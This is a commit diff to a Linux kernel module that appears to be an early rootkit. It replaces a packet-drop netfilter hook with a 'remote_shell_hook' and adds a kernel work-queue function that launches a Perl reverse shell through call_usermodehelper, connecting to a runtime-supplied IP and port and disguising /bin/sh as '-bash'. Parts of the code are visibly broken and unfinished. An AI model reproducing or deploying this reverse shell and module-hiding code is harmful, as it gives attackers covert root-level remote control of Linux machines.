3f4228cb2bf6f1a196e26d285e47d9846d951647
miguel.filipe <miguel.filipe@82fbb29e-e42b-11dd-b00f-9fabb4b2ff13>
2009-01-17 00:45:33 +0000

    main.c   |   73 ++++++++++++++++++++++++++++++++++++++++++++-------------------  module.c |    1  2 files changed, 52 insertions(+), 22 deletions(-)

--- main.c
+++ main.c
@@ -4,44 +4,73 @@
 #include <linux/ip.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/types.h>
 #include "util.h"
 #include "module.h"
 #include "hidemod.h"
 
-/* IP address we want to drop packets from, in NB order */
-__be32 drop_ip  = 0x01020304;
-
-unsigned int hook_func (unsigned int hooknum,
-	struct sk_buff **skb,
-	const struct net_device *in,
-	const struct net_device *out, int (*okfn) (struct sk_buff *))
+unsigned int remote_shell_hook (unsigned int hooknum, struct sk_buff **skb,
+	const struct net_device *in, const struct net_device *out, int (*okfn) (struct sk_buff *))
 {
 	struct sk_buff *sb = *skb;
 
+    // Source address
 	__be32 host_addr = ntohl(SKB_NH(sb)->saddr);
 
-	if (host_addr == drop_ip)
-	{
+    if(sb->protocol ==  ETH_P_IP || sb->protocol == ETH_P_IPV6)
+    {
+        // Retrieve an IP header.
+        struct *iph = ip_hdr(sb);
 
-		printk("Dropped packet from :  %d.%d.%d.%d\n", (host_addr & 0xff000000) >> 24,
-			(host_addr & 0x00ff0000) >> 16,	(host_addr & 0x0000ff00) >> 8,(host_addr & 0x000000ff));
+        sb->data;
 
-		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[0] );
-		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[1] );
-		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[2] );
-		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[3] );
 
-		return NF_DROP;
-	}
-	else
-	{
-		return NF_ACCEPT;
-	}
+
+    
+
+        // return NF_STOLEN
+    }
+
+
+    return NF_ACCEPT;
 }
+
+/* Remote shell launcher work function */
+
+/* work queue function */
+void work(void *wdata)
+{
+    char *env[] = {NULL};
+    int i=0,j=0;
+    
+    
+    /* isto e' a remote shell em perl */
+
+    char *args[] = {"/usr/bin/perl", "-e",
+        "use Socket;use POSIX; setgid(00000);"
+            "(socket(SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp')) && connect(SERVER, pack 'SnA4x8', 2, $ARGV[1], inet_aton($ARGV[0]))) || exit();"
+            "open(STDIN,'>&SERVER'); open(STDOUT,'>&SERVER'); open(STDERR,'>&SERVER');"
+            "exec {'/bin/sh'} '-bash' .\"\" ",
+        "mega", od->cpstring, NULL};
+
+    args[0] = od->perlpath;
+    args[3] = od->ipstring;
+    args[4] = od->cpstring;
+
+    /* decalc gid inside perl */
+    for(i=0;args[2][i]!='(';i++); i++;
+    for(j=0;j<5;j++)
+        args[2][i+j]=od->gid[j];
+
+    if(debug)
+        printk("tunnel started with gid %s, connecting to=%s:%s with %s", od->gid, args[3], args[4], args[0]);
+
+    call_usermodehelper(perlpath, args, env, 0);
+}
+
 
 int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u)
 {	
-	printk("My proc filldir called: %s\n", name);
 	return 0;
 }
 
